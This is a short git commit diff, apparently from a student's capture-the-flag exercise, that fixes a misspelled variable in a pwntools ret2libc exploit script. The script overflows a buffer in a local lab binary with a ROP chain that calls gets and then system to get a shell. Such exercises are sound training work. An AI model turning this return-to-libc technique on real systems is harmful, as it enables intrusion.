d8a31a5b8c4c88ac5398f4deba293b7878d7d711
Shawn <yuanxinyi@mails.ucas.ac.cn>
2023-04-25 16:54:17 +0800

    add report

--- ret2libc2/ret2libc2.py
+++ ret2libc2/ret2libc2.py
@@ -3,7 +3,7 @@
 from pwn import *
 
 gets_plt = 0x08048460
-sysrem_plt = 0x08048490
+system_plt = 0x08048490
 pop_ebx_ret_addr = 0x0804843d
 buf2_addr = 0x0804a080
 offset = 0x6c + 4
@@ -11,7 +11,7 @@ offset = 0x6c + 4
 payload = flat([b'A' * offset, \
 	gets_plt, \
 	pop_ebx_ret_addr, buf2_addr, \
-	sysrem_plt, 0xdeadbeef, buf2_addr])
+	system_plt, 0xdeadbeef, buf2_addr])
 
 sh = process('./ret2libc2')
 sh.sendline(payload)
